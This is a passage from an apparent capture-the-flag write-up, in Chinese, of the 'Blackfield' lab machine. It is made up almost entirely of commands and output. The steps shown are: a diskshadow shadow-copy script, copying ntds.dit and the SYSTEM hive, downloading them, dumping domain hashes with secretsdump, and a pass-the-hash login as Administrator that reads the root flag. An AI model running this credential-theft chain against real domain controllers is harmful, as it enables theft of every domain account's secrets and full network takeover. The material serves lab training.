*Evil-WinRM* PS C:\programdata\apps> Get-Content C:\Users\svc_backup\Desktop\dshadow.txt
set context persistent nowriters
add volume c: alias cdrive
create
expose %cdrive% z:
*Evil-WinRM* PS C:\programdata\apps> Format-Hex C:\Users\svc_backup\Desktop\dshadow.txt


           Path: C:\Users\svc_backup\Desktop\dshadow.txt

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   73 65 74 20 63 6F 6E 74 65 78 74 20 70 65 72 73  set context pers
00000010   69 73 74 65 6E 74 20 6E 6F 77 72 69 74 65 72 73  istent nowriters
00000020   0A 61 64 64 20 76 6F 6C 75 6D 65 20 63 3A 20 61  .add volume c: a
00000030   6C 69 61 73 20 63 64 72 69 76 65 0A 63 72 65 61  lias cdrive.crea
00000040   74 65 0A 65 78 70 6F 73 65 20 25 63 64 72 69 76  te.expose %cdriv
00000050   65 25 20 7A 3A 0D 0A                             e% z:..

```

验证挂载并复制 `ntds.dit` 与 `SYSTEM`。

```bash
*Evil-WinRM* PS C:\programdata\apps> ls Z:\Windows\NTDS
 


    Directory: Z:\Windows\NTDS


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/10/2023   6:29 PM           8192 edb.chk
-a----        4/27/2026  11:02 AM       10485760 edb.log
-a----        2/23/2020   9:41 AM       10485760 edb00004.log
-a----        2/23/2020   9:41 AM       10485760 edb00005.log
-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
-a----        2/23/2020   9:41 AM       10485760 edbtmp.log
-a----        4/27/2026  10:31 AM       18874368 ntds.dit
-a----        4/27/2026  10:31 AM          16384 ntds.jfm
-a----        4/27/2026  10:31 AM         434176 temp.edb


*Evil-WinRM* PS C:\programdata\apps> mkdir ntds


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/27/2026  11:10 AM                ntds


*Evil-WinRM* PS C:\programdata\apps> robocopy /b Z:\Windows\NTDS C:\programdata\apps\ntds ntds.dit

...

*Evil-WinRM* PS C:\programdata\apps> reg save HKLM\SYSTEM C:\programdata\apps\ntds\SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\programdata\apps> dir ntds


    Directory: C:\programdata\apps\ntds


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/27/2026  10:31 AM       18874368 ntds.dit
-a----        4/27/2026  11:11 AM       17383424 SYSTEM
```

下载至 kali。

```bash
*Evil-WinRM* PS C:\programdata\apps\ntds> download ntds.dit
                                        
Info: Downloading C:\programdata\apps\ntds\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata\apps\ntds> download SYSTEM
                                        
Info: Downloading C:\programdata\apps\ntds\SYSTEM to SYSTEM
                                        
Info: Download successful!

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ ls -liah SYSTEM     
2781608 -rw-rw-r-- 1 kali kali 17M Apr 27 07:24 SYSTEM
                                                                                                                              
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ ls -liha ntds.dit
2792050 -rw-rw-r-- 1 kali kali 18M Apr 27 07:19 ntds.dit
```

使用 secretsdump 爆破 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
...
...

┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ head -n 10 HASH.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
```

使用 hash 登录 Administrator 得到 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
4375a629c7c67c8e29db269060c955cb
```